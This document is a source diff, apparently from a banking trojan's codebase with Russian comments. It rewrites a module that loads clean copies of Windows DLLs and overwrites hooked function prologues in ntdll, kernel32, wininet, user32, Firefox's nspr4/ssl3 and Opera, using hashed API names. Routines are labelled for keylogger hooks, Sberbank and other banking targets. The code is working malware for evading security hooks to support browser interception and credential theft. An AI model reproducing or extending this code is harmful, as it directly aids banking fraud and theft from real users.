@@ -5,129 +5,239 @@
 #include "Strings.h"
 #include "Utils.h"
 #include "BotUtils.h"
+#include "DllLoader.h"
 //#include "antirapport.h"
 
-void WINAPI UnhookFunc( LPVOID hMap, WCHAR *Dll, DWORD dwProcNameHash )
+
+
+PIMAGE_NT_HEADERS Unhook_GetNTHeaders(LPVOID Image)
 {
+	// Получаем заголовок образа
+	if (!Image)
+		return NULL;
+	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Image;
+	if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE)
+		return NULL;
+
+	PIMAGE_NT_HEADERS NTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)Image + DosHeader->e_lfanew);
+	if (NTHeaders->Signature != IMAGE_NT_SIGNATURE)
+		NTHeaders = NULL;
+
+	return NTHeaders;
+}
+//---------------------------------------------------------------------------
+
+bool CanRestoreFunc(const char* Name, PDWORD ProcNameHashes)
+{
+	// Функция проверет необходимость восстановления нужной функции
+	DWORD Hash = STRA::Hash(Name);
+	while (*ProcNameHashes)
+	{
+		if (*ProcNameHashes == Hash)
+			return true;
+        ProcNameHashes++;
+    }
+	return false;
+}
+//---------------------------------------------------------------------------
+
+
+void WINAPI UnhookFunc(LPBYTE OriginalImage, LPBYTE CurrentImage, PDWORD ProcNameHashes)
+{
+	const static DWORD RestoreSize = 15;
+
+	PIMAGE_NT_HEADERS OriginalHeaders = Unhook_GetNTHeaders(OriginalImage);
+	PIMAGE_NT_HEADERS CurrentHeaders  = Unhook_GetNTHeaders(CurrentImage);
+
+	PIMAGE_DATA_DIRECTORY OriginalDirectory = &OriginalHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+	PIMAGE_DATA_DIRECTORY CurrentDirectory = &CurrentHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+
+	PIMAGE_EXPORT_DIRECTORY OriginalExports = (PIMAGE_EXPORT_DIRECTORY)(OriginalImage + OriginalDirectory->VirtualAddress);
+	PIMAGE_EXPORT_DIRECTORY CurrentExports  = (PIMAGE_EXPORT_DIRECTORY)(CurrentImage + CurrentDirectory->VirtualAddress);
+
+
+	PDWORD NameRef = (PDWORD)(OriginalImage + OriginalExports->AddressOfNames);
+	PWORD  Ordinal = (PWORD)(OriginalImage + OriginalExports->AddressOfNameOrdinals);
+
+	for (int i = 0; i < OriginalExports->NumberOfNames; i++, NameRef++, Ordinal++)
+	{
+		PCHAR Name = (PCHAR)(OriginalImage + *NameRef);
+		if (!CanRestoreFunc(Name, ProcNameHashes)) continue;
+
+        WORD idx = *Ordinal;
+		LPBYTE OriginalFunc = (OriginalImage + *(PDWORD)(OriginalImage + OriginalExports->AddressOfFunctions + (idx*4)));
+		LPBYTE CurrentFunc = (CurrentImage + *(PDWORD)(CurrentImage + CurrentExports->AddressOfFunctions + (idx*4)));
+
+		if (m_memcmp(OriginalFunc, CurrentFunc, RestoreSize) != 0)
+		{
+			DWORD OldProtect = 0;
+			if ((BOOL)pVirtualProtect((LPVOID)CurrentFunc, RestoreSize, PAGE_EXECUTE_READWRITE, &OldProtect ) )
+			{
+				m_memcpy(CurrentFunc, OriginalFunc, RestoreSize);
+				pVirtualProtect(CurrentFunc, RestoreSize, OldProtect, &OldProtect);
+			}
+        }
+	}
+}
+
+
+/*
+void WINAPI UnhookFunc( LPVOID hMap, LPVOID CurrentImage, PDWORD ProcNameHashes)
+{
+	if (!hMap || !CurrentImage || !ProcNameHashes)
+		return;
+
 	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)hMap + ( (PIMAGE_DOS_HEADER)hMap)->e_lfanew + sizeof( DWORD ) + sizeof( IMAGE_FILE_HEADER ) );
 	PIMAGE_EXPORT_DIRECTORY ped = (IMAGE_EXPORT_DIRECTORY*)RVATOVA( hMap, poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );	
 	ULONG *functionEntryPoints  = (ULONG*)( (ULONG)hMap + ped->AddressOfFunctions );
-				
-	int nOrdinal;
 
-	if ( HIWORD( (DWORD)dwProcNameHash) == 0 ) 
+
+	const static BYTE RestoreSize = 10;
+
+
+	DWORD *pdwNamePtr  = (DWORD*)RVATOVA(hMap, ped->AddressOfNames);
+	WORD *pwOrdinalPtr = (WORD*)RVATOVA(hMap, ped->AddressOfNameOrdinals);
+
+
+	BYTE entryPointBytes[RestoreSize];
+	BYTE originalBytes[RestoreSize];
+
+
+
+	for (int i = 0; i < ped->NumberOfNames; i++, pdwNamePtr++, pwOrdinalPtr++ )
 	{
-		nOrdinal = (LOWORD((DWORD)dwProcNameHash)) - ped->Base;
-	}
-	else
-	{
-		DWORD *pdwNamePtr  = (DWORD*)RVATOVA(hMap, ped->AddressOfNames);
-		WORD *pwOrdinalPtr = (WORD*)RVATOVA(hMap, ped->AddressOfNameOrdinals);
-
-		unsigned int i = 0;
-
-		BYTE entryPointBytes[10];
-		BYTE originalBytes[10];
-
-		DWORD dwImageBase = (DWORD)GetDllBase( CalcHashW( Dll ) );
-
-		if ( !dwImageBase )
+		PCHAR Name = (char*)RVATOVA( hMap, *pdwNamePtr );
+		if (CanRestoreFunc(Name, ProcNameHashes))
 		{
-			return;
-		}
+			// Восстанавливаем функцию
+			ULONG entryVA = (DWORD)CurrentImage + functionEntryPoints[*pwOrdinalPtr];
+			ULONG entryMA =	( (ULONG)hMap  + functionEntryPoints[*pwOrdinalPtr] );
 
-		for ( i = 0; i < ped->NumberOfNames; i++, pdwNamePtr++, pwOrdinalPtr++ )
-		{
-			if ( CalcHash( (char*)RVATOVA( hMap, *pdwNamePtr ) ) == dwProcNameHash )
+			m_memcpy( originalBytes, (LPVOID)entryMA, RestoreSize);
+			m_memcpy( entryPointBytes, (LPVOID)entryVA, RestoreSize);
+
+
+			if ( m_memcmp( entryPointBytes, originalBytes, RestoreSize) )
 			{
-				ULONG entryVA = dwImageBase + functionEntryPoints[i];
-				ULONG entryMA =	( (ULONG)hMap  + functionEntryPoints[i] );
+				DWORD dwOldProtect;
 
-				m_memcpy( originalBytes, (PVOID)entryMA, 10 );
-				m_memcpy( entryPointBytes, (LPVOID)entryVA, 10 );
-
-		    	if ( m_memcmp( entryPointBytes, originalBytes, 10 ) )
+				if ( (BOOL)pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, RestoreSize, PAGE_EXECUTE_READWRITE, &dwOldProtect ) )
 				{
-					DWORD dwOldProtect;
 
-					if ( (BOOL)pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, 10, PAGE_EXECUTE_READWRITE, &dwOldProtect ) )
-					{
-						m_memcpy( (LPVOID)entryVA, (LPCVOID)originalBytes, 10 );
-						pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, 10, dwOldProtect, &dwOldProtect );
-					}
+					// Сохраняем дампы для отладки
+//						string FN;
+//						FN.Format("c:\\Debug\\Unhook\\%s_Current.dat", Name);
+//						File::WriteBufferA(FN.t_str(), (LPVOID)entryVA, 30);
+//
+//						FN.Format("c:\\Debug\\Unhook\\%s_Original.dat", Name);
+//						File::WriteBufferA(FN.t_str(), (LPVOID)entryMA, 30);
 
-					break;
+					//pOutputDebugStringA(Name);
+
+					m_memcpy( (LPVOID)entryVA, (LPCVOID)originalBytes, 10 );
+					pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, 10, dwOldProtect, &dwOldProtect );
 				}
-			}				
-		}
-	}
-
-	return;
-}
-
-WCHAR *CopyDllToTemp( WCHAR *Dll, bool bIsSystem )
-{
-	WCHAR *SystemDll = (WCHAR*)MemAlloc( 512 );
-
-	if ( SystemDll == NULL )
-	{
-		return NULL;
-	}
-
-	if ( bIsSystem )
-	{
-		pGetSystemDirectoryW( SystemDll, MAX_PATH );
-		plstrcatW( SystemDll, L"\\");
-	}
-	else
-	{
-		pGetModuleFileNameW( (HMODULE)pGetModuleHandleW( NULL ), SystemDll, 255 );
-
-		for ( DWORD i = m_wcslen( SystemDll ) - 1; i > 0; i-- )
-		{
-			if ( SystemDll[i] == '\\' )
-			{
-				SystemDll[i + 1] = '\0';
-				break;
 			}
 		}
 	}
-
-	plstrcatW( SystemDll, Dll );
-
-	WCHAR *DllPath = GetTempName();
-
-	if ( DllPath != NULL )
-	{
-		if ( !(BOOL)pCopyFileW( SystemDll, DllPath, FALSE ) )
-		{
-			MemFree( SystemDll );
-			return NULL;
-		}
-	}
-
-	MemFree( SystemDll );
-	return DllPath;
 }
+*/
+//---------------------------------------------------------------------------
 
-
-void WINAPI RestoreFuncs( WCHAR *Dll, DWORD *dwFuncMass, bool bIsSystem )
+void WINAPI UnhookFunc(LPVOID OriginalImage, const char *Dll, PDWORD NameHashes)
 {
-	WCHAR *TempDll = CopyDllToTemp( Dll, bIsSystem );
+	// Функция снимает хуки с указанного массива хэщей функций
 
-	if ( TempDll == NULL )
-	{
+	// Получаем текущий образ
+	LPVOID CurrentImage = (LPVOID)GetDllBase(STRA::Hash(Dll));
+
+	PIMAGE_NT_HEADERS Headers = Unhook_GetNTHeaders(OriginalImage);
+
+	if (!Headers || !CurrentImage || !NameHashes)
 		return;
-	}
 
-	HANDLE hFile = pCreateFileW( TempDll, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
+	// Загружаем dlld промежуточный буфер
+	LPVOID OriginalDLL = MemAlloc(Headers->OptionalHeader.SizeOfImage);
+					
+
+	if (OriginalDLL)
+	{
+		// Копируем заголовки
+		DWORD CopySize = ((PIMAGE_DOS_HEADER)OriginalImage)->e_lfanew + Headers->OptionalHeader.SizeOfHeaders;
+		m_memcpy(OriginalDLL, OriginalImage, CopySize);
+
+		PIMAGE_NT_HEADERS NewHeaders = Unhook_GetNTHeaders(OriginalDLL);
+		NewHeaders->OptionalHeader.ImageBase = (DWORD)OriginalDLL;
+
+		// Копируем секции
+		CopySections((LPBYTE)OriginalImage, (LPBYTE)OriginalDLL, Headers, NewHeaders);
+
+		// Обрабатываем релоки
+		DWORD Delta = (DWORD)CurrentImage - Headers->OptionalHeader.ImageBase;
+		ProcessRelocation((LPBYTE)OriginalDLL, NewHeaders, Delta);
+
+
+		// Приводим оригинальный образ к настройкам загруженного образа
+		UnhookFunc((LPBYTE)OriginalDLL,  (LPBYTE)CurrentImage, NameHashes);
+
+        MemFree(OriginalDLL);
+    }
+
+}
+//---------------------------------------------------------------------------
+
+
+string CopyDllToTemp(const char* Dll)
+{
+	// Копируем dll во временный файл
+	string TempName;
+
+	HMODULE Module = (HMODULE)pGetModuleHandleA(Dll);
+	if (Module)
+	{
+		string Name(MAX_PATH);
+		pGetModuleFileNameA(Module, Name.t_str(), MAX_PATH);
+		if (!Name.IsEmpty())
+		{
+			TempName = File::GetTempName2A();
+			if (!pCopyFileA(Name.t_str(), TempName.t_str(), FALSE))
+			{
+				// В случае ошибки копирования обнуляем имя файла
+				TempName.Clear();
+            }
+        }
+    }
+    return TempName;
+}
+//---------------------------------------------------------------------------
+
+
+
+void WINAPI RestoreFuncs(TDllId Dll, DWORD *dwFuncMass)
+{
+	PCHAR DllName  = GetDLLName(Dll);
+	string TempDll = CopyDllToTemp(DllName);
+
+	if (TempDll.IsEmpty())
+		return;
+
+
+//	DWORD Size = 0;
+//	LPVOID Buf = File::ReadToBufferA(TempDll.t_str(), Size);
+//
+//	UnhookFunc(Buf, DllName, dwFuncMass);
+//
+//    MemFree(Buf);
+
+
+ 	HANDLE hFile = CreateFileA(TempDll.t_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
 	
 	HANDLE	hMapping = NULL;
 	LPVOID	hMap     = NULL;
 	
 	if ( hFile != INVALID_HANDLE_VALUE ) 
 	{
-		hMapping = pCreateFileMappingW( hFile, 0, PAGE_READONLY | SEC_IMAGE, 0, 0, 0 );
+		hMapping = pCreateFileMappingA( hFile, 0, PAGE_READONLY, 0, 0, 0 );
 
 		if ( hMapping != INVALID_HANDLE_VALUE )
 		{
@@ -135,32 +245,29 @@ void WINAPI RestoreFuncs( WCHAR *Dll, DWORD *dwFuncMass, bool bIsSystem )
 
 			if ( hMap )
 			{
-				for ( DWORD i = 0; dwFuncMass[i] != 0; i++ )
-				{
-					UnhookFunc( hMap, Dll, dwFuncMass[i] );
-				}
+				UnhookFunc(hMap, DllName, dwFuncMass);
+				pUnmapViewOfFile( hMap );
 			}
+
+			pCloseHandle( hMapping );
 		}
 	}
 
-	pUnmapViewOfFile( hMap );
 
-	pCloseHandle( hMapping );
 	pCloseHandle( hFile );
 
-	pDeleteFileW( TempDll );
-	MemFree( TempDll );
-
-	return;
+	pDeleteFileA(TempDll.t_str());
 }
+
+
 /************************************************************************/
 //* Восстанавливает неэкспорируемую функцию по её VA                    */
-void WINAPI UnhookFunc2( LPVOID hMap, WCHAR *Dll, DWORD dwProcVA )
+void WINAPI UnhookFunc2( LPVOID hMap, const char *Dll, DWORD dwProcVA )
 {
 	BYTE entryPointBytes[10];
 	BYTE originalBytes[10];
 
-	DWORD dwImageBase = (DWORD)GetDllBase( CalcHashW( Dll ) );
+	DWORD dwImageBase = (DWORD)GetDllBase( STRA::Hash(Dll));
 
 	if ( !dwImageBase )
 		{
@@ -191,23 +298,21 @@ void WINAPI UnhookFunc2( LPVOID hMap, WCHAR *Dll, DWORD dwProcVA )
 
 /************************************************************************/
 /* Восстанавливает вектор неэкспортируемых функций по их VA             */
-void WINAPI RestoreFuncs2( WCHAR *Dll, DWORD *dwFuncMass, bool bIsSystem )
+void WINAPI RestoreFuncs2( const char *Dll, DWORD *dwFuncMass)
 {
-	WCHAR *TempDll = CopyDllToTemp( Dll, bIsSystem );
+	string TempDll = CopyDllToTemp(Dll);
 
-	if ( TempDll == NULL )
-	{
+	if (TempDll.IsEmpty())
 		return;
-	}
 
-	HANDLE hFile = pCreateFileW( TempDll, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
+	HANDLE hFile = pCreateFileA( TempDll.t_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
 	
 	HANDLE	hMapping = NULL;
 	LPVOID	hMap     = NULL;
 	
 	if ( hFile != INVALID_HANDLE_VALUE ) 
 	{
-		hMapping = pCreateFileMappingW( hFile, 0, PAGE_READONLY | SEC_IMAGE, 0, 0, 0 );
+		hMapping = pCreateFileMappingA( hFile, 0, PAGE_READONLY | SEC_IMAGE, 0, 0, 0 );
 
 		if ( hMapping != INVALID_HANDLE_VALUE )
 		{
@@ -228,32 +333,29 @@ void WINAPI RestoreFuncs2( WCHAR *Dll, DWORD *dwFuncMass, bool bIsSystem )
 	pCloseHandle( hMapping );
 	pCloseHandle( hFile );
 
-	pDeleteFileW( TempDll );
-	MemFree( TempDll );
-
-	return;
+	pDeleteFileA(TempDll.t_str());
 }
 
-WCHAR ieframe_dll[]  = {'i','e','f','r','a','m','e','.','d','l','l',0};
-WCHAR kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
-WCHAR user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
-WCHAR ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',0};
-WCHAR ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};
-WCHAR wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',0};
-WCHAR nspr4_dll[]	 = {'n','s','p','r','4','.','d','l','l',0};
-WCHAR ssl3_dll[]	 = {'s','s','l','3','.','d','l','l',0};
-//opera
-WCHAR opera_dll[]	 = {'o','p','e','r','a','.','d','l','l',0};
-WCHAR gdi_dll[]		 = {'g','d','i','3','2','.','d','l','l',0};
-WCHAR winspool_drv[] = {'w','i','n','s','p','o','o','l','.','d','r','v',0};
-WCHAR commdlg32_dll[]= {'c','o','m','d','l','g','3','2','.','d','l','l',0};
-//for sound
-WCHAR winmm_dll[]= {'w','i','n','m','m','.','d','l','l',0};
-WCHAR advapi32_dll[]  = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
-WCHAR odbc32_dll[] = {'o','d','b','c','3','2','.','d','l','l',0};
-WCHAR crypt32_dll[]	 = {'c','r','y','p','t','3','2','.','d','l','l',0};
 
-//ieframe_dll
+//WCHAR ieframe_dll[]  = {'i','e','f','r','a','m','e','.','d','l','l',0};
+//WCHAR kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
+//WCHAR user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
+//WCHAR ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',0};
+//WCHAR ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};
+//WCHAR wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',0};
+//WCHAR nspr4_dll[]	 = {'n','s','p','r','4','.','d','l','l',0};
+//WCHAR ssl3_dll[]	 = {'s','s','l','3','.','d','l','l',0};
+////opera
+//WCHAR opera_dll[]	 = {'o','p','e','r','a','.','d','l','l',0};
+//WCHAR gdi_dll[]		 = {'g','d','i','3','2','.','d','l','l',0};
+//WCHAR winspool_drv[] = {'w','i','n','s','p','o','o','l','.','d','r','v',0};
+//WCHAR commdlg32_dll[]= {'c','o','m','d','l','g','3','2','.','d','l','l',0};
+////for sound
+//WCHAR winmm_dll[]= {'w','i','n','m','m','.','d','l','l',0};
+//WCHAR advapi32_dll[]  = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
+//WCHAR odbc32_dll[] = {'o','d','b','c','3','2','.','d','l','l',0};
+//WCHAR crypt32_dll[]	 = {'c','r','y','p','t','3','2','.','d','l','l',0};
+
 
 
 //commdlg
@@ -303,9 +405,9 @@ WCHAR crypt32_dll[]	 = {'c','r','y','p','t','3','2','.','d','l','l',0};
 #define C_CREATEPROCESSINTERNALA		0xE24394E4
 #define C_CREATEPROCESSINTERNALW		0xE24394F2
 #define C_CREATEFILEA					0x8F8F114				
-#define C_CREATEFILEW					0x8F8F102			
+#define C_CREATEFILEW					0x8F8F102
 #define C_COPYFILEA						0x2EE4F10D				
-#define C_COPYFILEW						0x2EE4F11B				
+#define C_COPYFILEW						0x2EE4F11B
 #define C_COPYFILEEXW					0x3C4277EE				
 #define C_LOADLIBRARYW					0xC8AC8030
 #define C_LOADLIBRARYEXW				0x20088E7C
@@ -479,20 +581,36 @@ void UnhookDlls()
 
 
 
-	RestoreFuncs( ntdll_dll,     dwNtdll,   true );
-	RestoreFuncs( kernel32_dll,  dwKernel,  true );
-	RestoreFuncs( ws2_32_dll,    dwWinsock, true );
-	RestoreFuncs( advapi32_dll,  dwAdvapi,  true );
-	RestoreFuncs( user32_dll,    dwUser32,  true );
-	RestoreFuncs( odbc32_dll,    dwOdbc,    true );
-	RestoreFuncs( crypt32_dll,   dwCrypt32, true );
-	RestoreFuncs( nspr4_dll,     dwNspr4,   false);
-	RestoreFuncs( ssl3_dll,      dwSsl3,    false);
-	RestoreFuncs( wininet_dll,   dwWininet, true );
-	RestoreFuncs( winmm_dll,     dwWinmm,   true );
-	RestoreFuncs( gdi_dll,       dwGdi32,   true );
-	RestoreFuncs( winspool_drv,  dwWinspool,true );
-	RestoreFuncs( commdlg32_dll, dwCommDlg, true );
+	RestoreFuncs( DLL_NTDLL,     dwNtdll);
+	RestoreFuncs( DLL_KERNEL32,  dwKernel);
+	RestoreFuncs( DLL_WINSOCK,    dwWinsock);
+	RestoreFuncs( DLL_ADVAPI32,  dwAdvapi);
+	RestoreFuncs( DLL_USER32,    dwUser32);
+	RestoreFuncs( DLL_ODBC32,    dwOdbc);
+	RestoreFuncs( DLL_CRYPT32,   dwCrypt32);
+	RestoreFuncs( DLL_SSL3,      dwSsl3);
+	RestoreFuncs( DLL_WININET,   dwWininet);
+	RestoreFuncs( DLL_WINMM,     dwWinmm);
+	RestoreFuncs( DLL_GDI,       dwGdi32);
+	RestoreFuncs( DLL_WINSPOOL,  dwWinspool);
+	RestoreFuncs( DLL_COMMDLG32, dwCommDlg);
+	RestoreFuncs( DLL_NSPR4,      dwNspr4);
+
+
+//	RestoreFuncs( ntdll_dll,     dwNtdll,   true );
+//	RestoreFuncs( kernel32_dll,  dwKernel,  true );
+//	RestoreFuncs( ws2_32_dll,    dwWinsock, true );
+//	RestoreFuncs( advapi32_dll,  dwAdvapi,  true );
+//	RestoreFuncs( user32_dll,    dwUser32,  true );
+//	RestoreFuncs( odbc32_dll,    dwOdbc,    true );
+//	RestoreFuncs( crypt32_dll,   dwCrypt32, true );
+//	RestoreFuncs( nspr4_dll,     dwNspr4,   false);
+//	RestoreFuncs( ssl3_dll,      dwSsl3,    false);
+//	RestoreFuncs( wininet_dll,   dwWininet, true );
+//	RestoreFuncs( winmm_dll,     dwWinmm,   true );
+//	RestoreFuncs( gdi_dll,       dwGdi32,   true );
+//	RestoreFuncs( winspool_drv,  dwWinspool,true );
+//	RestoreFuncs( commdlg32_dll, dwCommDlg, true );
 }
 
 
@@ -509,17 +627,14 @@ void UnhookIE()
 						  C_HTTPADDREQUESTHEADERSW, C_HTTPADDREQUESTHEADERSA,
 						  C_INTERNETCLOSEHANDLE, 0 };
 
-	RestoreFuncs( wininet_dll, dwWininet, true );
+	RestoreFuncs(DLL_WININET, dwWininet);
 
 	/////////////////////////////
-	DWORD dwUser32[] = {C_SHOWWINDOW,0xBF7EFB4C, 0 };
-	RestoreFuncs( user32_dll, dwUser32,  true );
+	DWORD dwUser32[] = {C_SHOWWINDOW, 0xBF7EFB4C, 0 };
+	RestoreFuncs(DLL_USER32, dwUser32);
 	/////////////////////////////
 	DWORD dwWinmm[] = {C_WAVEOUTWRITE, 0 };
-	RestoreFuncs( winmm_dll, dwWinmm,  true );
-	
-
-	return;
+	RestoreFuncs(DLL_WINMM, dwWinmm);
 }
 
 
@@ -530,8 +645,8 @@ void UnhookFF()
 
 	DWORD dwSsl3[]	= { C_SSLIMPORTFDHASH, 0 };
 
-	RestoreFuncs( nspr4_dll,  dwNspr4,   false );	
-	RestoreFuncs( ssl3_dll,   dwSsl3,    false );
+	RestoreFuncs(DLL_NSPR4,  dwNspr4);
+	RestoreFuncs( DLL_SSL3,  dwSsl3);
 
 	return;
 }
@@ -540,9 +655,7 @@ void UnhookFF()
 void UnhookUser32()
 {
 	DWORD dwUser32[] = { C_TRANSLATEMESSAGE, 0 };
-	RestoreFuncs( user32_dll, dwUser32,  true );
-
-	return;
+	RestoreFuncs(DLL_USER32, dwUser32);
 }
 
 /// Функции добавленные при добавлении RuBnk
@@ -550,34 +663,33 @@ void UnhookUser32()
 void UnhookTranslateMessage()
 {
 	DWORD dwUser32[] = { C_TRANSLATEMESSAGE, 0 };
-	RestoreFuncs( user32_dll, dwUser32,  true );
-
-	return;
+	RestoreFuncs(DLL_USER32, dwUser32);
 }
+
 void UnhookCreateFileW()
 {
 	DWORD dwKernel[]  = { C_CREATEFILEW, 0 };	
-	RestoreFuncs( kernel32_dll,  dwKernel,   true );
+	RestoreFuncs(DLL_KERNEL32,  dwKernel);
 }
 
 
 void UnhookKernel32Functions(DWORD* Functions)
 {
-   RestoreFuncs( kernel32_dll,  Functions,   true );
+   RestoreFuncs(DLL_KERNEL32,  Functions);
 }
 
 
 void UnhookIBancShowCreate()
 {
 	DWORD dwUser32[] = {C_CREATEWINDOWEXW, C_SHOWWINDOW, 0 };
-	RestoreFuncs( user32_dll, dwUser32,  true );
+	RestoreFuncs(DLL_USER32, dwUser32);
 
 	return;
 }
 void UnhookShowWindow()
 {
 	DWORD dwUser32[] = {C_SHOWWINDOW, 0 };
-	RestoreFuncs( user32_dll, dwUser32,  true );
+	RestoreFuncs( DLL_USER32, dwUser32 );
 	return;
 }
 
@@ -586,7 +698,7 @@ void UnhookShowWindow()
 void UnhookCookie()
 {
 	DWORD dwUser32[] ={ C_DIALOGBOX_PARAMW, 0 };
-	RestoreFuncs( user32_dll,  dwUser32,  true );
+	RestoreFuncs(DLL_USER32,  dwUser32);
 
 	return;
 }
@@ -598,16 +710,16 @@ void UnhookOpera(DWORD dwAddr)
 
 	// Opera.dll слинкована динамически, чтобы всё работало
 	// нужно подгрузить её в процесс раньше, чем браузер
-	pLoadLibraryW(opera_dll);
+	pLoadLibraryW(GetDLLName(DLL_OPERA));
 
-	RestoreFuncs2( opera_dll, dwOpera,  false );
+	RestoreFuncs2(GetDLLName(DLL_OPERA), dwOpera);
 	return;
 }
 
 void UnhookJava()
 {
  DWORD dwUser32[] ={ C_SHOWWINDOW, C_GETMESSAGEPOS, C_WINDOWFROMPOINT, 0 };
- RestoreFuncs( user32_dll,    dwUser32,  true );
+ RestoreFuncs(DLL_USER32, dwUser32);
 
  return;
 }
@@ -615,18 +727,14 @@ void UnhookJava()
 void UnhookGetMessagePos()
 {
  DWORD dwUser32[] ={ C_GETMESSAGEPOS, 0 };
- RestoreFuncs( user32_dll,    dwUser32,  true );
-
- return;
+ RestoreFuncs( DLL_USER32, dwUser32);
 }
 /************************************************************************/
 //кейлогеровские хуки
 void UnhookKeyLogger()
 {
 	DWORD dwUser32[] ={ C_PEEKMESSAGEA, C_GETMESSAGEA, C_PEEKMESSAGEW, C_GETMESSAGEW, 0 };
-	RestoreFuncs( user32_dll,  dwUser32,  true );
-
-	return;
+	RestoreFuncs( DLL_USER32,  dwUser32);
 }
 /************************************************************************/
 //хуки для Sber
@@ -635,37 +743,35 @@ void UnhookSber()
 	DWORD dwUser32[] ={ C_SHOWWINDOW, C_TRANSLATEMESSAGE,
 											C_DRAWTEXTA, C_DRAWTEXTW,
 											C_DRAWTEXTEXA, C_DRAWTEXTEXW, 0 };
-	RestoreFuncs( user32_dll,  dwUser32,  true );
+	RestoreFuncs( DLL_USER32,  dwUser32);
 
 	DWORD dwGdi32[] ={ C_TEXTOUTA, C_TEXTOUTW,
 										 C_EXTTEXTOUTA,	C_EXTTEXTOUTW, 0 };
-	RestoreFuncs( gdi_dll,  dwGdi32,  true );
+	RestoreFuncs(DLL_GDI,  dwGdi32 );
 
 	DWORD dwWinspool[] ={ C_ENUMPRINTERSA, 0 };
-	RestoreFuncs( winspool_drv, dwWinspool,  true );
+	RestoreFuncs(DLL_WINSPOOL, dwWinspool);
 
 	DWORD dwCommDlg[] ={ C_GETSAVEFILENAMEA, C_GETOPENFILENAMEA, 0 };
-	RestoreFuncs( commdlg32_dll, dwCommDlg,  true );
-
-	return;
+	RestoreFuncs(DLL_COMMDLG32, dwCommDlg);
 }
 
 void UnhookSetFocus()
 {
 	DWORD dwUser32[] ={ C_SETFOCUS, C_DispatchMessageA, C_DispatchMessageW, 0 };
-	RestoreFuncs( user32_dll,  dwUser32,  true );
+	RestoreFuncs( DLL_USER32,  dwUser32 );
 }
 
 
 void UnhookCreateFile()
 {
 	DWORD dwKernel[]  = { C_CREATEFILEA, C_CREATEFILEW, 0 };	
-	RestoreFuncs( kernel32_dll,  dwKernel,   true );
+	RestoreFuncs(DLL_KERNEL32,  dwKernel );
 	return;
 }
 
 void UnhookBeginEndPaint()
 {
 	DWORD dwUser32[] ={ C_BeginPaint, C_EndPaint, C_GetDCEx, 0 };
-	RestoreFuncs( user32_dll,  dwUser32,  true );
+	RestoreFuncs(DLL_USER32,  dwUser32);
 }
